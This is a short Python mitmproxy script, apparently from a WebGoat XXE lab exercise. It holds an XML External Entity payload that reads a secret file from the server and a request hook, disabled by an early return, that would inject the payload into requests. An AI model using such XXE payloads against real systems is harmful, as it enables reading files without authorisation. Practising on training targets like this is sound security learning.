from urllib.parse import urlencode, urlparse
import collections

from mitmproxy import http
from mitmproxy import ctx



XML = b"""
<?xml version="1.0"?>

<!--open the DOCTYPE declaration -
  the open square bracket indicates an internal DTD-->
<!DOCTYPE user [

<!--define the internal DTD-->
  <!ENTITY xxe SYSTEM "file:////home/webgoat/.webgoat-8.0.0.M24/XXE/secret.txt"> 
<!--close the DOCTYPE declaration-->
]>

<comment><text>&xxe;</text></comment>
""".replace(b'\n', b'')

def request(flow: http.HTTPFlow) -> None:
  return
  if 'blind' in flow.request.url:
      flow.request.headers['Content-Type'] = 'application/xml'
      flow.request.content = XML
      print(flow.request.content)
